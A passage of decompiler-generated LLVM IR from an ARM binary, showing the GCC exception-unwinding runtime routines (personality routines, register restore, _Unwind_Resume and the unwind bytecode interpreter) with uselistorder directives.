  uselistorder i32* %forced_unwind_-44, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r5.global-to-local, { 3, 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 13, 14, 15, 16, 17, 18, 19, 20, 21, 0 }
  uselistorder i32* %r0.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 13, 12, 14, 16, 15, 18, 17, 25, 26, 27, 28, 29, 30, 32, 31, 34, 33, 35, 19, 21, 20, 24, 22, 23, 0 }
  uselistorder i32* %fp.global-to-local, { 0, 1, 2, 3, 4, 7, 8, 6, 5, 9 }
  uselistorder i32 6, { 77, 0, 15, 16, 76, 4, 32, 33, 17, 28, 18, 29, 19, 30, 20, 31, 2, 34, 21, 35, 1, 5, 36, 37, 22, 38, 6, 39, 40, 41, 23, 42, 7, 43, 44, 45, 24, 46, 47, 48, 25, 49, 50, 51, 52, 8, 53, 54, 55, 56, 9, 57, 58, 59, 60, 61, 26, 62, 10, 63, 64, 65, 66, 67, 68, 27, 69, 11, 70, 71, 72, 73, 12, 74, 13, 14, 3, 75 }
  uselistorder i32 -3, { 4, 0, 5, 7, 6, 3, 1, 2 }
  uselistorder i32 52, { 23, 1, 2, 5, 12, 13, 9, 10, 11, 14, 16, 15, 6, 18, 19, 3, 20, 0, 21, 22, 7, 8, 17, 4 }
  uselistorder i32 48, { 17, 2, 0, 6, 4, 5, 9, 10, 7, 8, 14, 15, 16, 11, 12, 3, 13, 1 }
  uselistorder i32 44, { 40, 2, 41, 42, 0, 13, 3, 14, 4, 5, 6, 24, 25, 26, 27, 28, 29, 21, 22, 23, 7, 19, 20, 8, 1, 9, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 10, 11, 12, 15, 16, 17, 18 }
  uselistorder i32 -2147483648, { 3, 4, 5, 6, 7, 8, 9, 10, 0, 1, 2 }
  uselistorder i32 1073741824, { 3, 4, 5, 6, 7, 8, 9, 10, 0, 1, 2 }
  uselistorder i32 65536, { 4, 5, 6, 7, 9, 8, 14, 10, 15, 11, 16, 12, 17, 13, 18, 19, 20, 24, 21, 25, 22, 26, 23, 27, 145, 28, 150, 144, 149, 29, 30, 31, 32, 33, 34, 35, 36, 143, 37, 38, 39, 2, 40, 0, 3, 41, 42, 44, 43, 1, 47, 45, 46, 48, 146, 50, 49, 53, 54, 55, 51, 52, 56, 57, 59, 60, 61, 58, 62, 147, 63, 65, 64, 67, 66, 68, 148, 69, 71, 70, 73, 72, 78, 74, 79, 75, 80, 76, 77, 81, 82, 83, 84, 86, 87, 85, 142, 89, 88, 92, 93, 94, 90, 91, 95, 102, 96, 103, 97, 104, 98, 105, 99, 106, 100, 101, 108, 107, 109, 110, 111, 112, 117, 113, 118, 114, 119, 115, 116, 121, 120, 122, 123, 124, 127, 125, 128, 126, 129, 130, 131, 132, 133, 135, 136, 134, 137, 139, 140, 138, 141 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 100) to i32*), { 1, 0 }
  uselistorder i32 88, { 5, 6, 3, 0, 4, 1, 2 }
  uselistorder i32 100, { 0, 1, 3, 2, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_21698.346 to i32), { 28, 6, 29, 30, 7, 8, 64, 82, 83, 1, 2, 0, 3, 65, 66, 84, 9, 67, 85, 10, 11, 12, 13, 14, 27, 68, 86, 69, 87, 15, 16, 70, 71, 72, 88, 17, 89, 90, 91, 18, 92, 19, 73, 93, 94, 20, 21, 22, 95, 74, 96, 23, 97, 24, 98, 99, 100, 4, 26, 101, 75, 102, 77, 103, 25, 104, 105, 106, 34, 33, 35, 107, 108, 31, 59, 55, 53, 52, 54, 56, 57, 58, 51, 60, 46, 48, 47, 45, 44, 49, 50, 41, 40, 43, 42, 39, 38, 37, 36, 79, 61, 78, 62, 63, 80, 109, 5, 110, 111, 112, 113, 114, 32, 76, 115, 81 }
  uselistorder i32 -2, { 0, 30, 31, 6, 3, 4, 2, 7, 8, 9, 1, 5, 10, 26, 25, 27, 28, 29, 18, 19, 20, 21, 22, 23, 24, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 80, { 10, 11, 12, 0, 2, 1, 3, 4, 5, 8, 6, 7, 9 }
  uselistorder i32 %ucbp, { 0, 1, 3, 2 }
  uselistorder i32 %state, { 1, 0, 2 }
  uselistorder label %dec_label_pc_185c8, { 1, 0, 2, 3 }
  uselistorder label %bb166, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_184e4, { 1, 0 }
  uselistorder label %dec_label_pc_184ac, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_18470, { 1, 2, 3, 0, 4 }
  uselistorder label %bb163, { 1, 0 }
  uselistorder label %dec_label_pc_183ec, { 1, 0 }
  uselistorder label %bb161, { 1, 0 }
  uselistorder label %dec_label_pc_1832c, { 1, 2, 3, 5, 4, 0 }
  uselistorder label %dec_label_pc_18328, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_18288, { 1, 0 }
  uselistorder label %bb154, { 2, 0, 1 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %dec_label_pc_181e4, { 1, 0 }
  uselistorder label %dec_label_pc_181e4.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_181e4.preheader.lr.ph, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
}

define i32 @function_18684(i32 %arg1) local_unnamed_addr {
dec_label_pc_18684:
  %v0_18684 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18684, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_18684
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_18684, %bb
  %v10_1868c = phi i32 [ %arg1, %dec_label_pc_18684 ], [ 0, %bb ]
  ret i32 %v10_1868c

; uselistorder directives
  uselistorder i1 false, { 0, 1, 2, 3, 28, 29, 30, 45, 23, 27, 46, 47, 48, 49, 50, 5, 4, 51, 42, 43, 31, 32, 24, 35, 34, 33, 36, 6, 8, 7, 20, 44, 25, 26, 12, 39, 19, 21, 22, 11, 10, 9, 13, 14, 15, 37, 16, 17, 18, 41, 38, 40, 52, 53 }
  uselistorder i1* @cpsr_z, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 41, 14, 15, 16, 37, 38, 39, 40, 0, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 35, 36, 33, 34 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__aeabi_unwind_cpp_pr2(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_18694 = load i32, i32* @r1, align 4
  %v2_18694 = load i32, i32* @r2, align 4
  %v4_18694 = call i32 @__gnu_unwind_pr_common(i32 2, i32 %v1_18694, i32 %v2_18694, i32 2)
  ret i32 %v4_18694
}

define i32 @__aeabi_unwind_cpp_pr1(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_1869c = load i32, i32* @r1, align 4
  %v2_1869c = load i32, i32* @r2, align 4
  %v4_1869c = call i32 @__gnu_unwind_pr_common(i32 1, i32 %v1_1869c, i32 %v2_1869c, i32 1)
  ret i32 %v4_1869c
}

define i32 @__aeabi_unwind_cpp_pr0(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_186a4 = load i32, i32* @r1, align 4
  %v2_186a4 = load i32, i32* @r2, align 4
  %v4_186a4 = call i32 @__gnu_unwind_pr_common(i32 0, i32 %v1_186a4, i32 %v2_186a4, i32 0)
  ret i32 %v4_186a4

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @__gnu_unwind_pr_common, { 2, 1, 0 }
  uselistorder i32* @r2, { 10, 11, 12, 59, 13, 0, 22, 14, 23, 60, 61, 62, 18, 19, 20, 21, 41, 42, 43, 44, 63, 64, 65, 79, 80, 81, 82, 1, 68, 69, 2, 70, 71, 3, 72, 66, 67, 35, 36, 4, 5, 6, 57, 58, 7, 8, 45, 46, 47, 73, 74, 75, 76, 77, 78, 37, 38, 39, 48, 49, 50, 56, 24, 15, 16, 17, 27, 28, 25, 26, 29, 30, 31, 32, 33, 34, 40, 9, 51, 52, 53, 54, 55 }
}

define i32 @__restore_core_regs(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_186ac = add i32 %tmp, 56
  %v4_186ac = inttoptr i32 %v3_186ac to i32*
  %v5_186ac = load i32, i32* %v4_186ac, align 4
  %v6_186ac = add i32 %tmp, 60
  %v7_186ac = inttoptr i32 %v6_186ac to i32*
  %v8_186ac = load i32, i32* %v7_186ac, align 4
  %v2_186b8 = load i32, i32* %arg1, align 4
  %v3_186b8 = add i32 %tmp, 4
  %v4_186b8 = inttoptr i32 %v3_186b8 to i32*
  %v5_186b8 = load i32, i32* %v4_186b8, align 4
  store i32 %v5_186b8, i32* @r1, align 4
  %v12_186b8 = add i32 %tmp, 16
  %v13_186b8 = inttoptr i32 %v12_186b8 to i32*
  %v14_186b8 = load i32, i32* %v13_186b8, align 4
  store i32 %v14_186b8, i32* @r4, align 4
  %v15_186b8 = add i32 %tmp, 20
  %v16_186b8 = inttoptr i32 %v15_186b8 to i32*
  %v17_186b8 = load i32, i32* %v16_186b8, align 4
  store i32 %v17_186b8, i32* @r5, align 4
  %v18_186b8 = add i32 %tmp, 24
  %v19_186b8 = inttoptr i32 %v18_186b8 to i32*
  %v20_186b8 = load i32, i32* %v19_186b8, align 4
  store i32 %v20_186b8, i32* @r6, align 4
  %v21_186b8 = add i32 %tmp, 28
  %v22_186b8 = inttoptr i32 %v21_186b8 to i32*
  %v23_186b8 = load i32, i32* %v22_186b8, align 4
  store i32 %v23_186b8, i32* @r7, align 4
  %v24_186b8 = add i32 %tmp, 32
  %v25_186b8 = inttoptr i32 %v24_186b8 to i32*
  %v26_186b8 = load i32, i32* %v25_186b8, align 4
  store i32 %v26_186b8, i32* @r8, align 4
  %v27_186b8 = add i32 %tmp, 36
  %v28_186b8 = inttoptr i32 %v27_186b8 to i32*
  %v29_186b8 = load i32, i32* %v28_186b8, align 4
  store i32 %v29_186b8, i32* @sb, align 4
  %v30_186b8 = add i32 %tmp, 40
  %v31_186b8 = inttoptr i32 %v30_186b8 to i32*
  %v32_186b8 = load i32, i32* %v31_186b8, align 4
  store i32 %v32_186b8, i32* @sl, align 4
  store i32 %v8_186ac, i32* @ip, align 4
  store i32 %v5_186ac, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v8_186ac)
  ret i32 %v2_186b8

; uselistorder directives
  uselistorder i32 %v8_186ac, { 1, 0 }
  uselistorder i32 %tmp, { 7, 6, 5, 4, 3, 2, 1, 0, 9, 8 }
  uselistorder i32* @ip, { 48, 49, 50, 51, 13, 14, 5, 0, 54, 6, 7, 52, 53, 11, 12, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 1, 88, 89, 90, 91, 92, 93, 94, 95, 96, 8, 97, 98, 99, 33, 34, 43, 44, 2, 37, 38, 39, 40, 41, 42, 35, 9, 17, 10, 36, 20, 15, 16, 27, 28, 29, 30, 31, 32, 21, 22, 23, 24, 25, 26, 3, 18, 19, 45, 4, 46, 47 }
  uselistorder i32 40, { 32, 28, 29, 30, 31, 11, 33, 3, 12, 7, 8, 4, 14, 2, 9, 6, 13, 10, 15, 16, 17, 5, 18, 19, 0, 20, 22, 21, 23, 1, 24, 26, 25, 27 }
  uselistorder i32* @sb, { 125, 126, 127, 10, 11, 12, 13, 107, 108, 109, 110, 111, 112, 113, 114, 115, 118, 116, 117, 119, 91, 92, 65, 66, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 7, 4, 1, 2, 3, 5, 6, 8, 9, 25, 24, 30, 31, 26, 27, 28, 29, 32, 33, 34, 35, 36, 37, 40, 38, 39, 0, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 120, 121, 122, 123, 124 }
  uselistorder i32 36, { 15, 14, 4, 16, 6, 7, 5, 11, 13, 8, 12, 9, 0, 1, 2, 3, 10 }
  uselistorder i32* @r8, { 266, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 1, 265, 0, 32, 267, 10, 268, 33, 34, 35, 36, 19, 20, 21, 22, 23, 24, 25, 26, 27, 3, 28, 29, 30, 31, 37, 38, 39, 40, 11, 269, 16, 17, 4, 18, 201, 202, 5, 203, 204, 205, 229, 230, 231, 232, 233, 9, 234, 235, 236, 237, 238, 239, 240, 241, 177, 178, 179, 180, 191, 192, 193, 194, 195, 134, 135, 136, 137, 41, 42, 43, 44, 12, 13, 89, 90, 91, 92, 93, 45, 46, 47, 48, 94, 95, 96, 97, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 15, 14, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 79, 76, 77, 78, 80, 81, 6, 82, 83, 84, 85, 86, 87, 88, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 7, 156, 157, 158, 159, 160, 161, 162, 163, 8, 164, 165, 166, 167, 168, 169, 2, 170, 171, 172, 173, 174, 175, 176, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 196, 197, 198, 199, 200, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 242, 243, 244, 245, 246, 247 }
  uselistorder i32 32, { 86, 83, 84, 85, 47, 87, 88, 43, 53, 89, 42, 80, 48, 44, 65, 63, 64, 60, 61, 62, 72, 73, 66, 67, 55, 56, 90, 70, 71, 49, 78, 79, 81, 2, 3, 5, 4, 82, 7, 6, 9, 8, 11, 10, 57, 58, 59, 45, 50, 46, 74, 13, 12, 15, 14, 17, 16, 19, 18, 54, 21, 20, 22, 24, 23, 25, 26, 28, 27, 68, 69, 75, 29, 30, 51, 31, 32, 33, 52, 34, 0, 35, 1, 36, 76, 37, 77, 38, 39, 40, 41 }
  uselistorder i32 28, { 45, 10, 28, 46, 25, 47, 48, 49, 50, 7, 29, 30, 26, 27, 34, 11, 31, 12, 42, 43, 44, 8, 13, 0, 18, 1, 19, 2, 20, 3, 21, 4, 22, 5, 23, 6, 24, 9, 17, 33, 32, 14, 15, 16, 35, 36, 37, 38, 39, 40, 41 }
  uselistorder i32 24, { 96, 95, 97, 9, 10, 98, 1, 58, 59, 60, 61, 62, 63, 56, 57, 11, 64, 65, 75, 76, 66, 67, 8, 12, 94, 89, 90, 91, 2, 77, 78, 79, 38, 39, 13, 68, 69, 70, 53, 48, 40, 41, 42, 43, 44, 45, 46, 47, 49, 50, 51, 52, 54, 55, 71, 72, 73, 74, 14, 15, 16, 0, 17, 18, 3, 19, 20, 21, 4, 22, 23, 5, 24, 25, 26, 27, 28, 29, 6, 80, 30, 81, 82, 83, 84, 31, 32, 7, 85, 33, 86, 34, 35, 36, 87, 88, 92, 37, 93 }
  uselistorder i32 20, { 125, 123, 124, 126, 1, 4, 9, 33, 127, 29, 128, 129, 130, 131, 5, 132, 133, 2, 134, 34, 10, 30, 31, 32, 35, 36, 37, 47, 48, 38, 39, 135, 116, 117, 118, 119, 120, 121, 122, 11, 112, 113, 114, 3, 49, 12, 50, 51, 0, 28, 41, 6, 43, 13, 44, 27, 42, 40, 45, 46, 52, 53, 14, 54, 55, 56, 57, 58, 59, 60, 61, 15, 62, 63, 64, 65, 66, 67, 16, 68, 69, 17, 70, 71, 72, 73, 18, 74, 75, 19, 76, 77, 78, 79, 80, 20, 81, 82, 83, 84, 85, 86, 21, 87, 88, 89, 90, 22, 23, 91, 7, 92, 24, 93, 94, 95, 96, 8, 97, 25, 98, 99, 100, 101, 102, 26, 103, 104, 105, 106, 107, 108, 109, 110, 111, 115 }
  uselistorder i32* @r1, { 173, 16, 17, 18, 4, 174, 175, 64, 65, 81, 44, 2, 177, 45, 176, 156, 46, 47, 48, 19, 66, 1, 67, 68, 20, 180, 21, 5, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 6, 198, 199, 69, 71, 72, 73, 74, 75, 76, 77, 78, 79, 70, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 63, 62, 3, 80, 26, 163, 108, 109, 200, 22, 202, 203, 204, 205, 131, 132, 29, 201, 23, 30, 31, 32, 164, 165, 166, 167, 168, 169, 170, 171, 172, 43, 100, 101, 158, 7, 154, 155, 8, 159, 162, 160, 9, 161, 83, 84, 24, 152, 85, 153, 157, 133, 134, 12, 33, 34, 35, 36, 37, 38, 39, 10, 208, 209, 210, 211, 0, 212, 25, 82, 110, 127, 206, 207, 178, 179, 27, 13, 86, 111, 112, 113, 114, 115, 28, 135, 136, 87, 88, 40, 41, 42, 89, 90, 91, 93, 94, 92, 137, 95, 96, 97, 98, 99, 102, 103, 104, 14, 105, 106, 107, 116, 117, 118, 15, 119, 148, 149, 11, 120, 121, 122, 123, 124, 125, 126, 128, 129, 130, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 150, 151 }
  uselistorder i32 60, { 3, 22, 23, 24, 4, 5, 1, 6, 15, 16, 17, 18, 19, 20, 7, 11, 12, 8, 13, 14, 9, 10, 0, 2, 21 }
  uselistorder i32 56, { 3, 31, 32, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 9, 8, 2, 10, 11, 12, 13, 14, 28, 29, 25, 26, 4, 5, 1, 6, 0, 7, 27, 30 }
}

define i32 @__gnu_Unwind_Restore_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_186c8 = load i32, i32* @r0, align 4
  ret i32 %v1_186c8
}

define i32 @__gnu_Unwind_Save_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_186d0 = load i32, i32* @r0, align 4
  ret i32 %v1_186d0
}

define i32 @___Unwind_RaiseException(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_186e4 = ptrtoint i32* %stack_var_-68 to i32
  %v2_186e8 = call i32 @__gnu_Unwind_RaiseException(i32 %v2_186e4, i32 0)
  ret i32 %v2_186e8

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_Resume(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_18708 = ptrtoint i32* %stack_var_-68 to i32
  %v2_1870c = call i32 @__gnu_Unwind_Resume(i32 %v2_18708, i32 0)
  ret i32 %v2_1870c

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @_Unwind_Resume_or_Rethrow(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_1872c = ptrtoint i32* %stack_var_-68 to i32
  %v2_18730 = call i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %v2_1872c, i32 0)
  ret i32 %v2_18730

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_ForcedUnwind(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_18750 = ptrtoint i32* %stack_var_-68 to i32
  %v6_18754 = call i32 @__gnu_Unwind_ForcedUnwind(i32 %v2_18750, i32 %arg2, i8* %arg3, i32 %v2_18750)
  ret i32 %v6_18754

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i8* @_Unwind_GetLanguageSpecificData(i32 %context) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v5_18780 = call i32 @_Unwind_VRS_Get(i32 12, i32 0, i32 12, i32 0, i8* bitcast (i32* @0 to i8*))
  %v1_18788 = add i32 %tmp1, 76
  %v2_18788 = inttoptr i32 %v1_18788 to i32*
  %v3_18788 = load i32, i32* %v2_18788, align 4
  %v1_1878c = add i32 %v3_18788, 7
  %v2_1878c = inttoptr i32 %v1_1878c to i8*
  %v3_1878c = load i8, i8* %v2_1878c, align 1
  %v4_1878c = zext i8 %v3_1878c to i32
  %v1_18790 = add i32 %v3_18788, 8
  %v3_18794 = mul nuw nsw i32 %v4_1878c, 4
  %v2_18798 = add i32 %v3_18794, %v1_18790
  %v3_18798 = inttoptr i32 %v2_18798 to i8*
  ret i8* %v3_18798
}

define i32 @__gnu_unwind_execute(i32 %context, %anon_struct_13* %uws) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint %anon_struct_13* %uws to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %context, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v9_187a8 = load i32, i32* @r6, align 4
  %v21_187a8 = load i32, i32* @lr, align 4
  %v0_187ac = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_187ac, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 0, i32* @sl, align 4
  %tmp146 = bitcast i32* %stack_var_-36 to i8*
  br label %dec_label_pc_187bc

dec_label_pc_187bc:                               ; preds = %dec_label_pc_187bc.backedge, %entry
  %v3_187c8 = phi i32 [ %v0_187bc.pre, %dec_label_pc_187bc.backedge ], [ %tmp, %entry ]
  %v1_187bc = add i32 %v3_187c8, 8
  %v2_187bc = inttoptr i32 %v1_187bc to i8*
  %v3_187bc = load i8, i8* %v2_187bc, align 1
  %v4_187bc = zext i8 %v3_187bc to i32
  store i32 %v4_187bc, i32* %r3.global-to-local, align 4
  %v2_187c0 = icmp eq i8 %v3_187bc, 0
  store i1 %v2_187c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_187c0, label %dec_label_pc_187d0, label %.thread

.thread:                                          ; preds = %dec_label_pc_187bc
  %v2_187c4 = add nsw i32 %v4_187bc, -1
  store i32 %v2_187c4, i32* %r3.global-to-local, align 4
  %v2_187c8 = trunc i32 %v2_187c4 to i8
  store i8 %v2_187c8, i8* %v2_187bc, align 1
  %v0_187cc.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_187cc.pr.pr, label %.thread.dec_label_pc_187d0_crit_edge, label %dec_label_pc_187f8

.thread.dec_label_pc_187d0_crit_edge:             ; preds = %.thread
  %v0_187d0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_187d0

dec_label_pc_187d0:                               ; preds = %.thread.dec_label_pc_187d0_crit_edge, %dec_label_pc_187bc
  %v0_187d0 = phi i32 [ %v0_187d0.pre, %.thread.dec_label_pc_187d0_crit_edge ], [ %v3_187c8, %dec_label_pc_187bc ]
  %v1_187d0 = add i32 %v0_187d0, 9
  %v2_187d0 = inttoptr i32 %v1_187d0 to i8*
  %v3_187d0 = load i8, i8* %v2_187d0, align 1
  %v4_187d0 = zext i8 %v3_187d0 to i32
  store i32 %v4_187d0, i32* %r3.global-to-local, align 4
  %v2_187d4 = icmp eq i8 %v3_187d0, 0
  store i1 %v2_187d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_187d4, label %dec_label_pc_188d8, label %dec_label_pc_187dc

dec_label_pc_187dc:                               ; preds = %dec_label_pc_188cc, %dec_label_pc_187d0
  %v2_187e0 = phi i32 [ %v0_188cc, %dec_label_pc_188cc ], [ %v0_187d0, %dec_label_pc_187d0 ]
  %v0_187dc = phi i32 [ %v4_188cc, %dec_label_pc_188cc ], [ %v4_187d0, %dec_label_pc_187d0 ]
  %v1_187dc = add nsw i32 %v0_187dc, -1
  store i32 %v1_187dc, i32* %r3.global-to-local, align 4
  %v1_187e0 = trunc i32 %v1_187dc to i8
  %v3_187e0 = add i32 %v2_187e0, 9
  %v4_187e0 = inttoptr i32 %v3_187e0 to i8*
  store i8 %v1_187e0, i8* %v4_187e0, align 1
  %v0_187e4 = load i32, i32* @r5, align 4
  %v1_187e4 = add i32 %v0_187e4, 4
  %v2_187e4 = inttoptr i32 %v1_187e4 to i32*
  %v3_187e4 = load i32, i32* %v2_187e4, align 4
  store i32 %v3_187e4, i32* %r2.global-to-local, align 4
  %v1_187e8 = inttoptr i32 %v3_187e4 to i32*
  %v2_187e8 = load i32, i32* %v1_187e8, align 4
  store i32 %v2_187e8, i32* %r0.global-to-local, align 4
  %v4_187e8 = add i32 %v3_187e4, 4
  store i32 %v4_187e8, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_187f0 = inttoptr i32 %v0_187e4 to i32*
  store i32 %v2_187e8, i32* %v1_187f0, align 4
  %v5_187f0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_187f0, i32* %v2_187e4, align 4
  %v0_187f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_187f4 = trunc i32 %v0_187f4 to i8
  %v2_187f4 = load i32, i32* @r5, align 4
  %v3_187f4 = add i32 %v2_187f4, 8
  %v4_187f4 = inttoptr i32 %v3_187f4 to i8*
  store i8 %v1_187f4, i8* %v4_187f4, align 1
  br label %dec_label_pc_187f8

dec_label_pc_187f8:                               ; preds = %.thread, %dec_label_pc_187dc, %.thread6
  %v0_187f8 = load i32, i32* @r5, align 4
  %v1_187f8 = inttoptr i32 %v0_187f8 to i32*
  %v2_187f8 = load i32, i32* %v1_187f8, align 4
  %v3_187fc = udiv i32 %v2_187f8, 16777216
  store i32 %v3_187fc, i32* @r4, align 4
  store i32 %v3_187fc, i32* %ip.global-to-local, align 4
  %v3_18804 = mul i32 %v2_187f8, 256
  store i32 %v3_18804, i32* %r0.global-to-local, align 4
  %tmp182 = and i32 %v2_187f8, -16777216
  %tmp183 = icmp eq i32 %tmp182, -1342177280
  store i1 %tmp183, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_18804, i32* %v1_187f8, align 4
  br i1 %tmp183, label %dec_label_pc_188d8, label %dec_label_pc_18814

dec_label_pc_18814:                               ; preds = %dec_label_pc_187f8
  %v0_18814 = load i32, i32* @r4, align 4
  %v1_18814 = and i32 %v0_18814, 128
  store i32 %v1_18814, i32* %r1.global-to-local, align 4
  %v2_18814 = icmp eq i32 %v1_18814, 0
  store i1 %v2_18814, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18814, label %dec_label_pc_188f0, label %dec_label_pc_1881c

dec_label_pc_1881c:                               ; preds = %dec_label_pc_18814
  %v1_1881c = and i32 %v0_18814, 240
  store i32 %v1_1881c, i32* @r6, align 4
  %v7_18820 = icmp eq i32 %v1_1881c, 128
  store i1 %v7_18820, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18820, label %dec_label_pc_18828, label %dec_label_pc_1894c

dec_label_pc_18828:                               ; preds = %dec_label_pc_1881c
  %v0_18828 = load i32, i32* @r5, align 4
  %v1_18828 = add i32 %v0_18828, 8
  %v2_18828 = inttoptr i32 %v1_18828 to i8*
  %v3_18828 = load i8, i8* %v2_18828, align 1
  %v4_18828 = zext i8 %v3_18828 to i32
  store i32 %v4_18828, i32* %r3.global-to-local, align 4
  %v2_1882c = icmp eq i8 %v3_18828, 0
  store i1 %v2_1882c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1882c, label %dec_label_pc_1883c, label %.thread3

.thread3:                                         ; preds = %dec_label_pc_18828
  %v2_18830 = add nsw i32 %v4_18828, -1
  store i32 %v2_18830, i32* %r3.global-to-local, align 4
  %v2_18834 = trunc i32 %v2_18830 to i8
  store i8 %v2_18834, i8* %v2_18828, align 1
  %v0_18838.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18838.pr.pr, label %.thread3.dec_label_pc_1883c_crit_edge, label %dec_label_pc_1886c

.thread3.dec_label_pc_1883c_crit_edge:            ; preds = %.thread3
  %v0_1883c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1883c

dec_label_pc_1883c:                               ; preds = %.thread3.dec_label_pc_1883c_crit_edge, %dec_label_pc_18828
  %v2_18850 = phi i32 [ %v0_1883c.pre, %.thread3.dec_label_pc_1883c_crit_edge ], [ %v0_18828, %dec_label_pc_18828 ]
  %v1_1883c = add i32 %v2_18850, 9
  %v2_1883c = inttoptr i32 %v1_1883c to i8*
  %v3_1883c = load i8, i8* %v2_1883c, align 1
  %v4_1883c = zext i8 %v3_1883c to i32
